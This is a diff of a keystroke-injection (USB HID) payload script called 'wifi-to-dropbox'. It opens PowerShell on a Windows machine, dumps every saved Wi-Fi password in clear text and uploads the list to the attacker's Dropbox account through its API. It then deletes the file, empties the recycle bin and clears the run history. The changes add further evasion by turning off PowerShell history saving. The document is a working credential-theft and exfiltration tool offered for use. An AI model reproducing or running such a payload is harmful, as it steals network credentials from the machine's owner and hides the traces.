@@ -1,25 +1,27 @@
 REM ph3llin's wifi-to-dropbox 
-REM GRABS ALL WIFI PASSWORDS ON WINDOWS CREATES log.txt ON DESKTOP THEN UPLOADS TO YOUR DROPBOX MUST EDIT DROP BOX TOKEN BELOW
+REM GRABS ALL WIFI PASSWORDS ON WINDOWS CREATES computername.txt ON DESKTOP THEN UPLOADS TO YOUR DROPBOX MUST EDIT DROP BOX TOKEN BELOW
 ATTACKMODE HID
 DELAY 2000
 GUI r
-DELAY 200
+DELAY 2000
 STRING cmd
 ENTER
-DELAY 200
+DELAY 2000
 STRING powershell
 ENTER
-DELAY 200
-STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize > $env:USERPROFILE\Desktop\$env:computername.txt
-DELAY 100
+DELAY 5000
+STRING Set-PSReadLineOption -HistorySaveStyle SaveNothing
 ENTER
-DELAY 100
+DELAY 500
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize > $env:USERPROFILE\$env:computername.txt
+ENTER
+DELAY 500
 STRING $targetPathAndFilename =  '"' + "/" + $env:computername + ".txt" + '"'
 ENTER
 STRING $arg = '{ "path": '+$targetpathAndFilename+', "mode": "add", "autorename": true, "mute": false }'
 ENTER
 REM Insert your refresh_token, app_key and app_secret in the line below
-STRING $refreshToken = "INSERT_REFRESH_TOKEN_HERE"; $grantType = "refresh_token"; $requestUri = "https://api.dropboxapi.com/oauth2/token"; $app_key = "APP_KEY_HERE"; $app_secret = "APP_SECRET_HERE"
+STRING $refreshToken = "INSERT_REFRESH_TOKEN HERE"; $grantType = "refresh_token"; $requestUri = "https://api.dropboxapi.com/oauth2/token"; $app_key = "INSERT_APP_KEY_HERE"; $app_secret = "INSERT_APP_SECRET_HERE"
 ENTER
 STRING $requestBody = "refresh_token=$refreshToken&client_id=$app_key&client_secret=$app_secret&grant_type=$grantType"
 ENTER
@@ -31,23 +33,21 @@ STRING $headers = New-Object "System.Collections.Generic.Dictionary[[String],[St
 ENTER
 STRING $headers.Add("Authorization", $authorization); $headers.Add("Dropbox-API-Arg", $arg); $headers.Add("Content-Type", 'application/octet-stream')
 ENTER
-STRING $response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $env:USERPROFILE\Desktop\$env:computername.txt -Headers $headers
+STRING $response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $env:USERPROFILE\$env:computername.txt -Headers $headers
 ENTER
-DELAY 100
+DELAY 1000
 REM bottom code with delete log.txt and exit powershell
-STRING cd $env:USERPROFILE\Desktop
+STRING $delfilename = ".\" + "$env:computername" + ".txt"
 ENTER
-DELAY 100
-STRING $file = "$env:computername" + ".txt"
+DELAY 200
+STRING del $delfilename
 ENTER
-DELAY 100
-STRING del $file
-ENTER
-DELAY 100
+DELAY 200
 STRING Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 ENTER
 DELAY 500
 ALT F7
+DELAY 500
 STRING exit
 ENTER
 DELAY 200
